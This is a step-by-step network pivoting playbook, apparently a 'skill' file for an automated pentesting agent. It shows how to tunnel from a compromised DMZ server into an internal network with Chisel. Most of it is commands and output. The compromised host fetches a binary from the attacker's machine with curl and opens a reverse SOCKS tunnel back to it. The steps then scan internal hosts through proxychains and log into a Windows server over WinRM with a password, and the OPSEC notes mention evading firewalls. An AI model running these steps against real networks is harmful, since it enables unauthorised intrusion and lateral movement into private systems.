# Chisel Tunnel Pivot

## Scenario
Shell on DMZ server (10.10.10.75), need to access internal network (172.16.0.0/16).

## Step 1: Start Chisel Server on Attacker
```bash
attacker$ chisel server --reverse --port 8443
2025/01/15 18:00:00 server: Listening on http://0.0.0.0:8443
```

## Step 2: Connect Chisel Client from Pivot Host
```bash
www-data@dmz-server:~$ curl -s http://10.10.14.5:8080/chisel_linux_amd64 -o /tmp/c
www-data@dmz-server:~$ chmod +x /tmp/c
www-data@dmz-server:~$ /tmp/c client 10.10.14.5:8443 R:1080:socks &
2025/01/15 18:01:00 client: Connecting to ws://10.10.14.5:8443
2025/01/15 18:01:01 client: Connected (Latency 32ms)
```

## Step 3: Configure Proxychains
```bash
attacker$ tail -1 /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

## Step 4: Scan Internal Network Through Tunnel
```bash
attacker$ proxychains -q nmap -sT -Pn -p 22,80,445,3389 172.16.0.1-10 --open

Nmap scan report for 172.16.0.1
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http

Nmap scan report for 172.16.0.5
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.0.10
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
```

## Step 5: Access Internal Services
```bash
# Access internal web app
attacker$ proxychains -q curl -s http://172.16.0.1/ | head -5
<html><title>Internal Wiki</title>

# WinRM to internal Windows host
attacker$ proxychains -q evil-winrm -i 172.16.0.5 -u admin -p 'P@ssw0rd!'
*Evil-WinRM* PS C:\Users\admin\Documents> whoami
internal\admin
```

## Architecture
```
Attacker (10.10.14.5)
  ↕ Chisel server :8443
  ↕ SOCKS5 :1080
DMZ Server (10.10.10.75 / 172.16.0.100)
  ↕ Chisel client → reverse SOCKS
Internal Network (172.16.0.0/16)
  172.16.0.1  - Internal Wiki (Linux)
  172.16.0.5  - Windows Server (SMB/RDP)
  172.16.0.10 - Multi-service host
```

## OPSEC Notes
- Chisel uses HTTP WebSocket — may bypass some firewalls
- Traffic appears as HTTP/HTTPS on port 8443
- Consider using --tls for encrypted tunnel
- Monitor for unusual outbound connections from DMZ

## Next Steps
→ **discovery skill**: Full enumeration of 172.16.0.0/16 through tunnel
→ **credential_access skill**: Check internal hosts for weak credentials
→ **lateral_movement skill**: Move deeper into internal network
